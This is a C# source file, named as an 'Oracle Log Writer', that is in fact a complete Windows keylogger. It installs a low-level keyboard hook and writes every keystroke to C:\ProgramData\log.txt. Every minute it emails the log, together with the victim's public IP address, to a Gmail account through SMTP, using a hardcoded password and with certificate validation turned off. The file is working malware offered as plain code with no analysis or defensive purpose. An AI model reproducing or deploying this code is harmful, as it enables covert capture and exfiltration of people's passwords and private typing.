using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Timers;

namespace Oracle_Log_Writer
{
    static class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        public static bool isCapsOn;

        static void Main(string[] args)
        {
            // Sending emails timer
            Task.Run(async () =>
            {
                System.Timers.Timer aTimer = new System.Timers.Timer();
                if (File.Exists(@"C:\ProgramData\log.txt"))
                {
                    if (new FileInfo(@"C:\ProgramData\log.txt").Length > 0)
                    {
                        aTimer.Elapsed += new ElapsedEventHandler(EmailFactory.SendEmail);
                    }
                }
                aTimer.Interval = 60000; // Email miliseconds interval
                aTimer.Enabled = true;               
            }).GetAwaiter().GetResult();
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if ((((Keys)vkCode).ToString() == "Oemtilde") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("~");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("~");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D1") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("!");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("!");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D2") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("@");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("@");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D3") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("#");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("#");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D4") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("$");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("$");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D5") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("%");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("%");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D6") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("^");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("^");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D7") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("&");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("&");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D8") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("*");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("*");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D9") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("(");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("(");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "D0") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write(")");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(")");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "OemMinus") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("_");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("_");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "Oemplus") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("+");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("+");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "OemOpenBrackets") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("{");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("{");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "Oem6") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("}");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("}");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "Oem1") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write(":");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(":");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "Oemcomma") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("<");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "OemPeriod") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write(">");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(">");
                    output.Close();
                }
                else if ((((Keys)vkCode).ToString() == "OemQuestion") && (Control.ModifierKeys == Keys.Shift))
                {
                    Console.Out.Write("?");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("?");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Escape")
                {
                    Console.Out.Write("<Esc>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Esc>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F1")
                {
                    Console.Out.Write("<F1>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F1>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F2")
                {
                    Console.Out.Write("<F2>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F2>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F3")
                {
                    Console.Out.Write("<F3>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F3>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F4")
                {
                    Console.Out.Write("<F4>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F4>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F5")
                {
                    Console.Out.Write("<F5>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F5>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F6")
                {
                    Console.Out.Write("<F6>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F6>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F7")
                {
                    Console.Out.Write("<F7>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F7>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F8")
                {
                    Console.Out.Write("<F8>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F8>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F9")
                {
                    Console.Out.Write("<F9>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F9>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F10")
                {
                    Console.Out.Write("<F10>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F1>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F11")
                {
                    Console.Out.Write("<F11>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F11>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "F12")
                {
                    Console.Out.Write("<F12>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<F12>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemtilde")
                {
                    Console.Out.Write("`");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("`");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    Console.Out.Write("1");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("1");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    Console.Out.Write("2");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("2");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    Console.Out.Write("3");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("3");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    Console.Out.Write("4");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("4");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    Console.Out.Write("5");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("5");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    Console.Out.Write("6");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("6");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    Console.Out.Write("7");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("7");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    Console.Out.Write("8");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("8");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    Console.Out.Write("9");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("9");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    Console.Out.Write("0");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("0");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemMinus")
                {
                    Console.Out.Write("-");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("-");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemplus")
                {
                    Console.Out.Write("=");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("=");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Back")
                {
                    Console.Out.Write("<Bck>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    string copy = File.ReadAllText(@"C:\ProgramData\log.txt");
                    copy = copy.Remove(copy.Length - 1);
                    File.WriteAllText(@"C:\ProgramData\log.txt", copy);
                    output.Write("<Bck>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Tab")
                {
                    Console.Out.Write("<Tab>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Tab>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemOpenBrackets")
                {
                    Console.Out.Write("[");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("[");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oem6")
                {
                    Console.Out.Write("]");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("]");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oem5")
                {
                    Console.Out.Write("|");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("|");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Capital")
                {
                    Console.Out.Write("<Caps>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Caps>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oem1")
                {
                    Console.Out.Write(";");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(";");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oem7")
                {
                    Console.Out.Write("'");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("'");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    Console.Out.Write("<Ent>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Ent>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "LShiftKey")
                {
                    Console.Out.Write("<LShift>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<LShift>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemQuestion")
                {
                    Console.Out.Write("/");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("/");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "RShiftKey")
                {
                    Console.Out.Write("<RShift>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<RShift>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "LControlKey")
                {
                    Console.Out.Write("<LCtrl>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<LCtrl>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "LWin")
                {
                    Console.Out.Write("<Lwin>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<LWin>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "RControlKey")
                {
                    Console.Out.Write("<RCtrl>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<RCtrl>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Insert")
                {
                    Console.Out.Write("<Ins>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Ins>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Home")
                {
                    Console.Out.Write("<Home>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Home>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "PageUp")
                {
                    Console.Out.Write("<PageUp>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<PageUp>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Delete")
                {
                    Console.Out.Write("<Del>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Del>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "End")
                {
                    Console.Out.Write("<End>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<End>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Next")
                {
                    Console.Out.Write("<PageDown>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<PageDown>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Up")
                {
                    Console.Out.Write("<Up>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Up>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Down")
                {
                    Console.Out.Write("<Down>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Down>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Left")
                {
                    Console.Out.Write("<Left>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Left>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Right")
                {
                    Console.Out.Write("<Right>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Right>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumLock")
                {
                    Console.Out.Write("<Numlock>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Numlock>");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Divide")
                {
                    Console.Out.Write("/");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("/");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Multiply")
                {
                    Console.Out.Write("*");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("*");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Subtract")
                {
                    Console.Out.Write("-");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("-");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad7")
                {
                    Console.Out.Write("7");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("7");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad8")
                {
                    Console.Out.Write("8");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("8");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad9")
                {
                    Console.Out.Write("9");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("9");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Add")
                {
                    Console.Out.Write("+");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("+");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad4")
                {
                    Console.Out.Write("4");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("4");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad5")
                {
                    Console.Out.Write("5");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("5");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad6")
                {
                    Console.Out.Write("6");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("6");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad1")
                {
                    Console.Out.Write("1");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("1");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad2")
                {
                    Console.Out.Write("2");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("2");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad3")
                {
                    Console.Out.Write("3");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("3");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "NumPad0")
                {
                    Console.Out.Write("0");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("0");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Decimal")
                {
                    Console.Out.Write("<Decimal>");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write("<Decimal>");
                    output.Close();
                }
                else
                {
                    string button = ((Keys)vkCode).ToString();
                    if (Control.IsKeyLocked(Keys.CapsLock))
                    {
                        isCapsOn = true;
                    }
                    else
                    {
                        isCapsOn = false;
                    }
                    if (((!(Control.ModifierKeys == Keys.Shift)) && isCapsOn == false) || (Control.ModifierKeys == Keys.Shift) && isCapsOn == true)
                    {
                        button = button.ToLower();
                    }
                    Console.Out.Write(button);
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                    output.Write(button);
                    output.Close();
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }

    public class EmailFactory
    {
        public static string GetPublicIpAddress()
        {
            var request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");

            request.UserAgent = "curl"; // this will tell the server to return the information as if the request was made by the linux "curl" command

            string publicIPAddress;

            request.Method = "GET";
            using (WebResponse response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    publicIPAddress = reader.ReadToEnd();
                }
            }

            return publicIPAddress.Replace("\n", "");
        }

        public static void SendEmail(object source, ElapsedEventArgs e)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            SmtpServer.Timeout = 10000;
            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
            SmtpServer.UseDefaultCredentials = false;
            SmtpServer.Port = 587;

            mail.From = new MailAddress("archive.log.test@gmail.com");
            mail.To.Add(new MailAddress("archive.log.test@gmail.com"));

            mail.Subject = DateTime.Today.ToString("dd.MM.yyyy ") + DateTime.Now.ToString("HH:mm:ss") + ", IP: " + GetPublicIpAddress();

            StreamReader r = new StreamReader(@"C:\ProgramData\log.txt");
            string body = r.ReadToEnd();
            r.Dispose();
            mail.Body = body;

            SmtpServer.Credentials = new System.Net.NetworkCredential("archive.log.test@gmail.com", "Falownik19") as ICredentialsByHost; SmtpServer.EnableSsl = true;
            ServicePointManager.ServerCertificateValidationCallback = delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
            {
                return true;
            };

            mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
            SmtpServer.Send(mail);
            File.WriteAllText(@"C:\ProgramData\log.txt", String.Empty);
        }
    }
}